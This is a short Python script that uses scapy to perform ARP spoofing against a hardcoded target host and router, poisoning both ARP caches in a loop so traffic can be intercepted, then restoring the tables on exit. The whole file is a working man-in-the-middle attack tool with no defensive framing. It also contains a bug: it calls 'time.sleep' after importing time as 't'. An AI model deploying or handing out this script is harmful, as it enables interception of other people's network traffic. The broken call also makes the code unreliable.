#!/usr/bin/env python3

import scapy.all as scapy
import time as t
#import sys as s
#import argparse as argp

# Small backlog and comments:
# create a function to verify if the program is running in root environment
# apply the ip forward on IPv4 packets
# import the data to an csv file
#def interactive:   # interactive function
#def get_arguments: # get_args of the program

def get_mac_addr(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac_addr(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac_addr(dst_ip)
    src_mac = get_mac_addr(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
            psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.1.228"
gateway_ip = "192.168.1.1"

sent_packets_count = 0
try:
    while True:
        spoof("192.168.1.228", "192.168.1.1")
        spoof("192.168.1.1", "192.168.1.228")
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("")
    print("#####################")
    print("[+] Detected Ctrl + C")
    print("[+] Resetting ARP Tables of the target IP and the router...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[!] Quitting...")
